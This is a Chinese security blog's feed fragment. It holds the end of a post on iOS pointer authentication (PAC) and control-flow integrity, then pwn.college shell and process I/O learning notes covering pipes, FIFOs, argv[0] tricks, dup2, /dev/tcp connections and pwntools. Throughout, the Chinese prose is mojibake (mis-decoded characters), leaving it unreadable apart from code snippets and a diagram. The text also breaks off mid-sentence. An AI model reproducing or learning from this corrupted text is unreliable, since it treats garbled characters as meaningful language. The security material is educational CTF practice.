64ä½æŒ‡é’ˆé«˜ä½å†—ä½™ç‰¹æ€§ï¼Œå¯¹å†…å­˜ä¸­çš„å…³é”®æŒ‡é’ˆåŠ ä¸Šè®¤è¯ä¿¡æ¯</li><li>åœ¨æŒ‡é’ˆè¢«è§£å¼•ç”¨æˆ–è€…å½“åšæ§åˆ¶æµè·³è½¬ç›®çš„åœ°å€å‰æ ¡éªŒæŒ‡é’ˆçš„å®Œæ•´æ€§</li></ul><img src="/2022/11/18/ios-system-security-framework-study-1/5.png"><p>PACçš„æ‰§è¡Œæµç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                +-----------+----------------------------------+</span><br><span class="line">                | len = 25  |           len = 39               |</span><br><span class="line">                +----------------------------------------------+</span><br><span class="line">                |           |                                  |</span><br><span class="line">                |           |      pointer                     |</span><br><span class="line">                |           |                                  |</span><br><span class="line">                +-----------+----------+-----------------------+</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       |                     +------------------+</span><br><span class="line">                                       |                     |                  |</span><br><span class="line">                                       v                     |    APDAKey       |</span><br><span class="line">                          +------------+------------+        |                  |</span><br><span class="line">+----------------+        |                         |        |    APDBKey       |</span><br><span class="line">|                |        |                         |        |                  |</span><br><span class="line">|    modifier    +-------&gt;+   PAC instructions      +&lt;-------+    APIAKey       |</span><br><span class="line">|                |        |                         |        |                  |</span><br><span class="line">+----------------+        |                         |        |    APIBKey       |</span><br><span class="line">                          +------------+------------+        |                  |</span><br><span class="line">                                       |                     |    APGAKey       |</span><br><span class="line">                                       |                     |                  |</span><br><span class="line">                                       |                     |                  |</span><br><span class="line">                                       |                     |                  |</span><br><span class="line">                                       |                     +------------------+</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       |</span><br><span class="line">                                       v</span><br><span class="line">                 +----------+----------+-----------------------+</span><br><span class="line">                 |          |                                  |</span><br><span class="line">                 | PAC part |       pointer                    |</span><br><span class="line">                 |          |                                  |</span><br><span class="line">                 +----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>ä¸€å…±æœ‰äº”ä¸ªç¡¬ä»¶Keyï¼Œåªèƒ½ä½¿ç”¨æ— æ³•è¯»å–ï¼›modifierä¸ºä¸€ä¸ªç”¨æˆ·å¯æ§çš„è¾“å…¥å†…å®¹ï¼Œæœ€åå¾—åˆ°çš„æ£€éªŒå€¼æ”¾åœ¨æŒ‡é’ˆå‰é¢ã€‚</p><p>åŸºäºç¡¬ä»¶æ”¯æŒå®ç°å¯¹æŒ‡é’ˆçš„å®Œæ•´æ€§ä¿æŠ¤ï¼ŒAppleèŠ¯ç‰‡é¥é¥é¢†å…ˆä¸šç•Œï¼Œä»iPhone XSå¼€å§‹ï¼Œå•†ä¸šåŒ–åº”ç”¨PACã€‚</p><p>iOS12ï¼šåŸºäºPACçš„æ§åˆ¶æµå®Œæ•´æ€§<br>iOS14ï¼šåŸºäºPACçš„æ§åˆ¶æµå®Œæ•´æ€§+éƒ¨åˆ†æ•°æ®æŒ‡é’ˆå®Œæ•´æ€§ï¼ˆé‡ç‚¹é˜²æŠ¤æ”»å‡»è€…å¸¸ç”¨ï¼‰</p><p>æ•´ä¸ªå®‰å…¨æœºåˆ¶æ¶‰åŠï¼šç¼–è¯‘å™¨ + å†…æ ¸å¼€å‘ + æ”»å‡»æ‰‹æ®µå­¦ä¹ ï¼ˆç ”ç©¶æ”»å‡»è€…å–œæ¬¢çš„æ•°æ®æŒ‡é’ˆï¼‰</p><p>å®ç°çš„æ•ˆæœï¼šæ­£å‘ï¼ˆvptrã€vtblå®Œæ•´æ€§ã€callbackå®Œæ•´æ€§ï¼‰+ åå‘ï¼ˆæ ˆè¿”å›åœ°å€ï¼‰çš„CFI + éƒ¨åˆ†æ•°æ®æŒ‡é’ˆä¿æŠ¤</p><ul><li>å½»åº•æ¶ˆé™¤äº†ç›´æ¥æ§åˆ¶æµåŠ«æŒçš„æ¼æ´åˆ©ç”¨</li><li>æå¤§é™åˆ¶äº†æ”»å‡»è€…å†…å­˜ç ´åèƒ½åŠ›</li></ul><p>ç°åœ¨è¦æ”»å‡»iOSï¼Œå¿…é¡»è¦å…ˆé€šè¿‡æ¼æ´æ„é€ æœ‰é™åœ°å€è¯»å†™ï¼Œä¹‹åæ‰æœ‰æœºä¼šæ„é€ ä»£ç æ‰§è¡Œï¼Œå¹¶ä¸èƒ½ç›´æ¥é€šè¿‡æ¼æ´è¿›è¡Œæ§åˆ¶æµåŠ«æŒã€‚</p><h3 id="æ”»å‡»é¢çš„å˜åŒ–"><a href="#æ”»å‡»é¢çš„å˜åŒ–" class="headerlink" title="æ”»å‡»é¢çš„å˜åŒ–"></a>æ”»å‡»é¢çš„å˜åŒ–</h3><img src="/2022/11/18/ios-system-security-framework-study-1/6.png"><h3 id="è‹¹æœçš„ä¸‹ä¸€æ­¥"><a href="#è‹¹æœçš„ä¸‹ä¸€æ­¥" class="headerlink" title="è‹¹æœçš„ä¸‹ä¸€æ­¥"></a>è‹¹æœçš„ä¸‹ä¸€æ­¥</h3><p>é’ˆå¯¹ç”¨æˆ·éšç§</p><ul><li>iOS 14.5 å¯ç”¨App Tracking Transparencyï¼Œå¼ºåˆ¶Appå…¬ç¤ºæ”¶é›†ä½¿ç”¨çš„ç”¨æˆ·ä¿¡æ¯</li><li>iOS 15å°†æ¨å‡ºâ€œåº”ç”¨éšç§æŠ¥å‘Šâ€å’Œæ›´ç»†ç²’åº¦çš„â€œé™åˆ¶è¿½è¸ªç”¨æˆ·â€åŠŸèƒ½</li></ul><p>ARM v8.5</p><ul><li>Memory Tagging</li><li>æ€§èƒ½æŸè€— vs å®‰å…¨æ”¶ç›Š</li></ul><h3 id="ä¸€äº›æ€è€ƒ"><a href="#ä¸€äº›æ€è€ƒ" class="headerlink" title="ä¸€äº›æ€è€ƒ"></a>ä¸€äº›æ€è€ƒ</h3><p>ä¸ºä»€ä¹ˆAppleæŒç»­åœ¨å®‰å…¨æŠ•å…¥ï¼Ÿ</p><ul><li>ç³»ç»Ÿå®‰å…¨æ˜¯iOSç”Ÿæ€çš„åŸºçŸ³</li><li>ç³»ç»Ÿå®‰å…¨æ˜¯iOSä¸šåŠ¡ç‰¹æ€§çš„ä¸€éƒ¨åˆ†</li><li>ç³»ç»Ÿå®‰å…¨æ˜¯Appleå•†ä¸šæ¨¡å‹çš„æŠ¤åŸæ²³</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç³»ç»Ÿå®‰å…¨ç»è¿‡ç†è®ºæ¢ç´¢åˆ°åŸå‹å®è·µï¼Œæ€»ç»“å‡ºâ€œéš”ç¦»+è®¿é—®æ§åˆ¶â€çš„åŸºæœ¬æ¶æ„ï¼Œä½†æ˜¯åœ¨ä¸ªäººç”µè„‘æ—¶ä»£é—®é¢˜é¢‘å‡ºã€‚</p><p>iOSä»¥å¯ä¿¡è®¡ç®—ä¸ºåŸºç¡€ï¼Œæ‰“é€ å…¨æ–°çš„iOSç”Ÿæ€ï¼Œå®‰å…¨æˆä¸ºiOSç”Ÿæ€å’Œä¸šåŠ¡æ¨¡å¼çš„æŠ¤åŸæ²³</p><p>éšç€å®‰å…¨æœºåˆ¶ä¸æ–­æ”¹è¿›ï¼Œå†…å­˜å®‰å…¨è¿æ¥æ‹ç‚¹</p><p>å®‰å…¨çš„åšå¼ˆå±æ€§å’Œæœ¨æ¡¶æ•ˆåº”æ³¨å®šå¯¹æŠ—ä¸ä¼šæ­¢æ­¥ï¼ˆå„ç±»é€»è¾‘æ¼æ´å¼€å§‹çˆ†å‘ï¼‰</p><p>æ¼æ´é˜²å¾¡è¿‡ç¨‹ä¸­å››å¤§éš¾é¢˜</p><ul><li>æ”»å‡»é¢å¤šæ ·æ€§</li><li>æ¼æ´å¤šæ ·æ€§</li><li>æ¼æ´åˆ©ç”¨æ–¹æ³•çš„å¤šæ ·æ€§</li><li>èƒ½è¾¾åˆ°æ”»å‡»ç›®æ ‡çš„è·¯å¾„çš„å¤šæ ·æ€§</li></ul><p>ä¸‰ç§ç­–ç•¥</p><ul><li>ä»æºå¤´ä¸Šé˜²å¾¡ï¼šå‡å°‘æ¼æ´çš„äº§ç”Ÿï¼Œå‡å°‘æ”»å‡»é¢ï¼Œå¢åŠ æ”»å‡»ç¯èŠ‚</li><li>å°é”å…³é”®è·¯å¾„ï¼šå°é”æ¼æ´è§¦å‘-&gt;æ¼æ´åˆ©ç”¨çš„ä¸­é—´ç¯èŠ‚</li><li>è‡ªåº•å‘ä¸Šï¼šä¾èµ–ç¡¬ä»¶å®‰å…¨ç‰¹æ€§æ”¯æ’‘è½¯ä»¶å®‰å…¨</li></ul><h2 id="å…¶ä»–æœ‰ç”¨èµ„æ–™"><a href="#å…¶ä»–æœ‰ç”¨èµ„æ–™" class="headerlink" title="å…¶ä»–æœ‰ç”¨èµ„æ–™"></a>å…¶ä»–æœ‰ç”¨èµ„æ–™</h2><p>google p0 ioså†…æ ¸æ¼æ´è¿‘å†µ <a href="https://googleprojectzero.blogspot.com/2020/06/a-survey-of-recent-ios-kernel-exploits.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2020/06/a-survey-of-recent-ios-kernel-exploits.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å­¦ä¹ å®Œç‹é“ç£Šå¤§ä½¬åœ¨åä¸ºçš„åˆ†äº«è§†é¢‘ï¼Œè®°å½•æ€»ç»“ä¸€äº›æœ‰ç”¨çš„å†…å®¹ã€‚è¿˜ä¼šæ ¹æ®åˆ†äº«çš„å†…å®¹å†é¢å¤–è¡¥å……ä¸€äº›å…¶ä»–ç›¸å…³å†…å®¹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•&quot;&gt;&lt;a href=&quot;#æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•&quot; class=&quot;headerlink&quot; title=&quot;æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ios" scheme="https://hurricane618.me/tags/ios/"/>
    
      <category term="å®‰å…¨æœºåˆ¶" scheme="https://hurricane618.me/tags/%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>pwn.college å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰</title>
    <link href="https://hurricane618.me/2022/05/26/pwn-college-writeup-one/"/>
    <id>https://hurricane618.me/2022/05/26/pwn-college-writeup-one/</id>
    <published>2022-05-26T12:14:01.000Z</published>
    <updated>2022-05-26T12:16:15.934Z</updated>
    
    <content type="html"><![CDATA[<img src="/2022/05/26/pwn-college-writeup-one/1.png"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¸€æ®µæ—¶é—´æ‰¾åˆ°äº†<code>pwn.college</code>è¿™ä¸ªç½‘ç«™ï¼Œå‘ç°é‡Œé¢çš„æ¨¡å—åˆ’åˆ†çš„ååˆ†è¯¦ç»†ï¼Œé¢˜ç›®ä¹Ÿç®€å•å®¹æ˜“ä¸Šæ‰‹ï¼Œéå¸¸é€‚åˆæˆ‘è¿™ç§èœé¸¡ä½œä¸ºè®­ç»ƒé¢˜ï¼Œäºæ˜¯ä»å¹´å‰å¼€å§‹ä¸€ç›´åˆ·åˆ°äº†ç°åœ¨ã€‚ä¸­é—´ç”±äºå†™è®ºæ–‡å’Œç­”è¾©çš„äº‹æƒ…è€½è¯¯äº†å¾ˆä¹…ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ä¹Ÿåªåˆ·å®Œäº†ä¸€åŠçš„æ¨¡å—ï¼Œä¸ºäº†å·©å›ºå­¦åˆ°çš„ä¸€äº›å†…å®¹ï¼Œå°†å…¶æ•´ç†æˆå­¦ä¹ ç¬”è®°çš„æ–¹å¼ï¼Œä¹Ÿæ¬¢è¿å„ä½å¸ˆå‚…ä¸€èµ·è®¨è®ºã€‚æœ€åä¹‹æ‰€ä»¥ä¸æŠŠå…·ä½“çš„é¢˜è§£æ”¾å‡ºæ¥ï¼Œä¸€æ˜¯å› ä¸ºå…¶ä¸­æœ‰å¾ˆå¤šé¢˜ç›®éƒ½æ˜¯ä¸¾ä¸€åä¸‰çš„æ€§è´¨ï¼Œå…¨éƒ¨å†™å‡ºæ¥ä¼šæ˜¾å¾—å¾ˆå•°å—¦ï¼›äºŒæ˜¯å› ä¸ºè¯¥ç½‘ç«™çš„åˆ›å§‹äººè¯´å°½é‡ä¸è¦åœ¨ç½‘ä¸Šå…¬å¼€writeupï¼Œè¿™ä¸ªæ˜¯ä»–ä»¬çš„è¯¾ç¨‹ç»ƒä¹ ç½‘ç«™ã€‚ç»¼ä¸Šï¼Œæˆ‘åªåœ¨è¿™é‡Œè®°å½•é¢˜ç›®ä¸­çš„å…³é”®æ€è·¯å’Œå­¦åˆ°çš„çŸ¥è¯†ç‚¹ã€‚</p><h2 id="module1-ç¨‹åºIOäº¤äº’æ¨¡å—"><a href="#module1-ç¨‹åºIOäº¤äº’æ¨¡å—" class="headerlink" title="module1 ç¨‹åºIOäº¤äº’æ¨¡å—"></a>module1 ç¨‹åºIOäº¤äº’æ¨¡å—</h2><h3 id="å‘½ä»¤è¡Œä¸shell"><a href="#å‘½ä»¤è¡Œä¸shell" class="headerlink" title="å‘½ä»¤è¡Œä¸shell"></a>å‘½ä»¤è¡Œä¸shell</h3><p><code>env xxx -i</code> èƒ½å¤Ÿä»¥<code>-i</code>åé¢çš„å‚æ•°ä¸ºç¯å¢ƒå˜é‡æ‰§è¡Œxxxç¨‹åºï¼Œæ˜¯ä¸€ä¸ªèƒ½å¿«é€Ÿä¿®æ”¹æ‰§è¡Œç¨‹åºç¯å¢ƒå˜é‡çš„æ–¹æ³•ã€‚</p><p>level36ï¼šä¸€å¼€å§‹ç†è§£é”™äº†é¢˜ç›®çš„æ„æ€ï¼Œæäº†åŠå¤©æ²¡æƒ³åˆ°ç›´æ¥ç”¨å‘½ä»¤è¡Œçš„ç®¡é“<code>|</code>å°±è§£å†³äº†ã€‚ã€‚ã€‚</p><p>linux shellä¸­çš„åˆ©ç”¨ç®¡é“æ§åˆ¶ç¨‹åºçš„è¾“å…¥å³ä¸ºåœ¨ç®¡é“çš„å·¦ä¾§ï¼Œæ¯”å¦‚ï¼Œ<code>xxxx | /program</code>ï¼Œæ§åˆ¶ç¨‹åºçš„è¾“å‡ºå³ä¸ºç®¡é“å³ä¾§ï¼Œæ¯”å¦‚<code>/program | xxxx</code>ã€‚å¦‚æœè¿›ç¨‹å¾ˆå¿«å°±ç»“æŸäº†ï¼Œæœ‰ä¸ªtrickæ˜¯è¯»å–å¤§æ–‡ä»¶æ‹–å»¶è¯»å–çš„é€Ÿåº¦ï¼Œä½¿å¾—checkèƒ½å¤Ÿæ­£å¸¸è¿›è¡Œï¼Œè€Œä¸ä¼šå› ä¸ºå‰é¢çš„è¿›ç¨‹æ‰§è¡Œå¤ªå¿«å¯¼è‡´checkå¤±è´¥ã€‚ï¼ˆé’ˆå¯¹revç¨‹åºï¼‰</p><p>level66ï¼šæœ¬æ¥æƒ³çš„æ˜¯ç”¨findçš„execé€‰é¡¹ä½¿ç”¨<code>ld-linux-x86-64.so.2</code>åŠ è½½äºŒè¿›åˆ¶æ‰§è¡Œï¼Œç»“æœæœ‰æƒé™çš„é—®é¢˜ã€‚æœ€åè¿™æ ·æˆåŠŸæ‰§è¡Œ <code>find /challenge -name &quot;embryoio_level66&quot; -type f -exec {} \;</code>ã€‚</p><p>level72ï¼šå¯ä»¥ç›´æ¥ç”¨fdå·åœ¨shellä¸­è¿›è¡Œæ–‡ä»¶å¥æŸ„çš„é‡å®šå‘ã€‚</p><p>level88ã€89ï¼šä»shellè„šæœ¬æ§åˆ¶<code>argv[0]</code>çš„éªšæ“ä½œã€‚ä¸€ä¸ªæ˜¯åˆ©ç”¨è½¯è¿æ¥ï¼Œ<code>ln -s /challenge/embryoio_level88 /tmp/zxygjb</code>ï¼Œè¿™æ ·æ‰§è¡Œ<code>/tmp/zxygjb</code>å°±èƒ½å˜æˆæ‰§è¡Œ<code>/challenge/embryoio_level88</code>ï¼Œä½†æ˜¯å®ƒçš„<code>argc[0]</code>æ˜¯<code>/tmp/zxygjb</code>ã€‚å¦å¤–ä¸€ä¸ªæ˜¯æ§åˆ¶<code>PATH</code>ç¯å¢ƒå˜é‡ï¼Œè®©<code>/tmp</code>åŠ å…¥<code>PATH</code>ä¸­ï¼Œè¿™æ ·ç›´æ¥æ‰§è¡Œ<code>zxygjb</code>å³å¯ï¼Œè¿™æ ·å°±åˆ©ç”¨shellå®Œæˆäº†å¯¹<code>argv[0]</code>çš„æ§åˆ¶ã€‚</p><p>level90ï¼šshellä¸­çš„æ–‡ä»¶ç®¡é“çš„ä½¿ç”¨ï¼Œæ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯å‘ç®¡é“å†™æ•°æ®å¿…é¡»ç”¨<code>&gt;</code>ï¼Œä»ç®¡é“è¯»æ•°æ®æ—¶å¿…é¡»ç”¨<code>&lt;</code>ã€‚è¿˜æœ‰ä¸€ç‚¹æ˜¯å†™ç®¡é“çš„æ—¶å€™å¿…é¡»è¦ç”¨<code>&amp;</code>æŠŠè¿›ç¨‹æŒ‚åˆ°åå°ã€‚<code>echo &quot;smctvvbb&quot; &gt;  myfifo &amp;; /challenge/embryoio_level90 0&lt;myfifo</code></p><p>level93ï¼šå®Œå…¨ä¸çŸ¥é“æ€ä¹ˆå…ˆæŠŠç®¡é“ä¸­çš„å†…å®¹è¾“å‡ºå‡ºæ¥ï¼Œå†è¾“å…¥æ•°æ®ã€‚æœ€åå‚è€ƒäº†ç¾¤ä¸­å¸ˆå‚…çš„æ€è·¯ï¼Œ<code>cat outfifo &amp;; cat &gt; infifo;</code>è¿™æ ·å°±å¯ä»¥å…ˆè·å¾—è¾“å‡ºçš„å†…å®¹ï¼Œå†åˆ©ç”¨<code>cat</code>è¾“å…¥ä»€ä¹ˆè¾“å‡ºä»€ä¹ˆçš„ç‰¹ç‚¹å‘ç®¡é“ä¸­å†™æ•°æ®ã€‚</p><p>level97ï¼šä½¿ç”¨<code>kill -signum pid</code>å¯ä»¥å‘é€æŒ‡å®šçš„ä¿¡å·ç»™æŒ‡å®šçš„è¿›ç¨‹ã€‚</p><p>level140ï¼š<code>/dev/tcp/IP/Port</code>è®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯è·å¾—ä¸IP:Porté€šä¿¡äº¤äº’çš„èƒ½åŠ›ã€‚ç„¶è€Œè¿™é“é¢˜å¿…é¡»è¦ç”¨shellè„šæœ¬æ¥å»ºç«‹tcpè¿æ¥ï¼ŒçœŸæ˜¯æ¶å¿ƒğŸ¤¢ã€‚æˆ‘çœ‹åˆ°çš„ä¸€ä¸ªwriteupä¸­æœ‰ä¸€ä¸ªéªšæ“ä½œï¼Œé‚£å°±æ˜¯æŠŠpython3.8æ”¹æˆbashå°±èƒ½ç»•è¿‡æ£€æŸ¥ï¼Œç¬‘æ­»ğŸ¤£ã€‚</p><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>ç”¨Cè¯­è¨€ç¨‹åºå®ç°stdinå’Œstdoutçš„é‡å®šå‘ï¼Œéœ€è¦åˆ©ç”¨dup2é‡æ–°è®¾ç½®æ–‡ä»¶æè¿°ç¬¦çš„æŒ‡å‘ã€‚è¯­æ³•<code>dup2(fd, 0);</code>ï¼Œè¿™é‡Œçš„æ„æ€å°±æ˜¯æ‹¿fdæ–‡ä»¶æè¿°ç¬¦æ›¿æ¢æ ‡å‡†è¾“å…¥ï¼Œè¿™æ ·fdå†…çš„æ•°æ®å°±ä¼šè¢«å½“åšç¨‹åºçš„è¾“å…¥ã€‚</p><p>level60ï¼šç»ˆäºæ¥åˆ°äº†æ‹¿Cè¯­è¨€å†™ç®¡é“çš„é˜¶æ®µï¼Œè¿™é‡Œæœ‰ç‚¹å‘çš„åœ°æ–¹åœ¨äºéœ€è¦å¼€ä¸¤ä¸ªå­è¿›ç¨‹ï¼Œä¸€ä¸ªå­è¿›ç¨‹æ‹¿æ¥æ‰§è¡Œlevelç¨‹åºï¼Œå¦å¤–ä¸€ä¸ªæ‹¿æ¥æ‰§è¡Œcatç¨‹åºï¼Œç°åœ¨æƒ³æƒ³å¥½åƒå’Œpythonçš„ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å¿…é¡»è¦ç”Ÿæˆä¸¤ä¸ªå­è¿›ç¨‹å»å¤„ç†ã€‚</p><p>level69ï¼šè§„å®šå¿…é¡»è¦ç”¨bashï¼Œä½†æ˜¯ä¸ä¸€å®šå¿…é¡»è¦ä»shellä¸­æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç¨‹åºè°ƒç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ‰§è¡Œç¨‹åºï¼Œéšåç”¨shellè°ƒç”¨è¯¥ç¨‹åºï¼Œè¿™æ ·å°±èƒ½æ›´ç»†ç²’åº¦çš„æ§åˆ¶ç¨‹åºï¼Œæ¯”å¦‚è¿™é“é¢˜èƒ½å¤Ÿç”¨Cè¯­è¨€çš„<code>execve</code>æ‰§è¡Œç¨‹åºä¸”argvä¸ºç©ºã€‚å¾ˆç¥å¥‡æ˜¯å§ï¼Œå¦‚æœæ˜¯shellå¿…ç„¶ä¸å¯èƒ½ä¸ºç©ºã€‚æœ€åï¼Œshell -&gt; Cç¨‹åº -&gt; challengeã€‚</p><p>level73ï¼šå¯ä»¥ä½¿ç”¨<code>chdir</code>æ”¹å˜å·¥ä½œç›®å½•ï¼Œè¿™æ ·é…åˆshellè„šæœ¬å¯ä»¥åˆ¶é€ å‡ºçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„å·¥ä½œç›®å½•ä¸ä¸€æ ·ã€‚</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>level48ï¼šä½¿ç”¨pwntoolsçš„processæ‰§è¡Œè¿›ç¨‹å¹¶ç”¨ç®¡é“é€šä¿¡æ—¶ä¼šå‡ºç°é”™è¯¯ï¼Œè€Œä½¿ç”¨subprocessåˆ™æ²¡æœ‰é—®é¢˜ï¼Œè¿™æ˜¯å¾ˆç¥å¥‡çš„åœ°æ–¹ã€‚æœ€åå†™åœ¨ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä¸­ï¼Œåœ¨ipythoné‡Œ<code>%run xxx.py</code>æ‰§è¡Œè„šæœ¬ï¼Œå³å¯è·å¾—flagã€‚å¦å¤–ä¸€ç§æ‰§è¡Œçš„æ–¹å¼æ˜¯æŠŠæ‰€æœ‰è¯­å¥éƒ½å†™æˆä¸€è¡Œï¼Œé€šè¿‡<code>;</code>è¿›è¡Œåˆ†å‰²ã€‚</p><p>level54ï¼šæˆ‘ç”¨level48çš„è„šæœ¬å»å¤„ç†ç»“æœå‘ç°å®ƒçš„checkeræ¯æ¬¡æ£€æŸ¥éƒ½æ˜¯<code>docker-init</code>ï¼Œä¸å¤ªæ‡‚ä¸ºå•¥ä¼šå˜æˆdockerçš„å­è¿›ç¨‹äº†ï¼Œè„šæœ¬ä¸Šä¸€å±‚çš„pythonå»å“ªé‡Œäº†ï¼Œä¸ä¼šæ˜¯å› ä¸ºæ‰§è¡Œå¤ªå¿«çš„åŸå› ï¼Ÿæœ€åé‡‡ç”¨å®Œæ•´çš„ç®¡é“é€šä¿¡è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p><p>level75ï¼šè®©æˆ‘çŸ¥é“äº†pythonè„šæœ¬ä¹Ÿæ˜¯æ²¡æœ‰åŠæ³•ä½¿å¾—argvä¸ºç©ºæ‰§è¡Œç¨‹åºçš„ï¼ŒCè¯­è¨€çœŸçš„å¼ºï¼Œå¯æ§åˆ¶èƒ½åŠ›æ— æ•Œã€‚æ•´æ´»å°èƒ½æ‰‹ï¼</p><p>level76ï¼šè¿˜æ˜¯ä¸€æ ·çš„å‘ç°pythonè„šæœ¬çš„envåç§°ç«Ÿç„¶ä¹Ÿä¸èƒ½è®¾ç½®æˆæ•°å­—ï¼ŒCè¯­è¨€æ— æ•Œã€‚</p><p>level103ï¼šæ²¡æƒ³åˆ°ç®¡é“æ–‡ä»¶å¿…é¡»è¦åŒæ—¶æœ‰ä¸€ä¸ªè¿›ç¨‹è¯»ï¼Œä¸€ä¸ªè¿›ç¨‹å†™æ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå¦åˆ™ä¼šä¸€ç›´é˜»å¡ã€‚è€Œä¸”ä¸èƒ½æŠŠè¿›ç¨‹ç”¨<code>&amp;</code>æŒ‚åœ¨åå°ã€‚ã€‚ã€‚çœŸæ˜¯æ— è¯­ï¼ŒæŒ‚åœ¨åå°ä¹‹åè¿›ç¨‹ä¼šå¤„äºstopçŠ¶æ€ï¼Œå› æ­¤æˆ‘çš„æ–¹æ³•æ˜¯å¼€ä¸¤ä¸ªsshè¿æ¥ï¼Œä¸€è¾¹å¼€ä¸€ä¸ªpythonè„šæœ¬ï¼Œä¸€ä¸ªè„šæœ¬å†™ä¸€ä¸ªè„šæœ¬è¯»ä¸”ä½œä¸ºstdinè¾“å…¥ã€‚</p><p>level106ï¼šæ‰“å¼€ç®¡é“æ–‡ä»¶ä¹‹åè¦ä»é‡Œé¢è¯»æ•°æ®ä¸èƒ½ç”¨<code>read()</code>æˆ–è€…<code>readlines()</code>ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œå¯èƒ½æ˜¯å› ä¸ºç®¡é“æ–‡ä»¶æ°¸è¿œæ²¡æœ‰å°½å¤´ï¼Ÿåªèƒ½ä½¿ç”¨<code>read(size)</code>å’Œ<code>readline()</code>çš„æ–¹å¼è¯»ã€‚</p><p>level107ï¼šè¦æ‰“å¼€191çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä»è¿™é‡Œæˆ‘å‘ç°å¯ä»¥ç›´æ¥ç”¨<code>os.dup2(0,191)</code>ã€‚å³å¯è¿‡checkï¼Œç„¶åé€šè¿‡<code>process(&quot;/challenge/embryoio_level107&quot;, close_fds=False)</code>å¯åŠ¨è¿›ç¨‹ï¼Œå†æ¥æ”¶æ•°æ®è¾“å…¥å¯†ç å³å¯é€šè¿‡ã€‚</p><p>level109ï¼šä¸€é“ç¥å¥‡çš„é¢˜ç›®ï¼Œéœ€è¦ä»stdoutä¸­è¯»æ•°æ®ï¼Œé‚£ä¹ˆåŸæ¥çš„stdoutæ€ä¹ˆåŠå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä½¿ç”¨sys.stdinå¼ºè¡Œè¯»å–è¾“å…¥å¹¶å°†è¾“å…¥ä¼ ç»™stdoutã€‚<code>p1 = process(&quot;/challenge/embryoio_level109&quot;, stdout=sys.stdin)</code>ã€‚è¿™é‡Œä¸€å¼€å§‹æ²¡æƒ³åˆ°èƒ½æˆåŠŸï¼Œsysèƒ½å¼ºè¡Œè¯»å–shellä¸­è·å¾—çš„è¾“å…¥æ•°æ®ï¼Œæ‰€ä»¥å°±ç®—çœ‹ä¸è§å®é™…ä¸Šè¿˜æ˜¯ä¼ è¾“ç»™äº†stdoutã€‚è€Œå¦‚æœåªæ˜¯æ‰“å¼€æŸä¸ªæ–‡ä»¶ï¼Œå› ä¸ºåªæ˜¯å•å‘é€šé“ï¼Œæ‰€ä»¥è¿™é“é¢˜æ˜¯æ€ä¹ˆæ 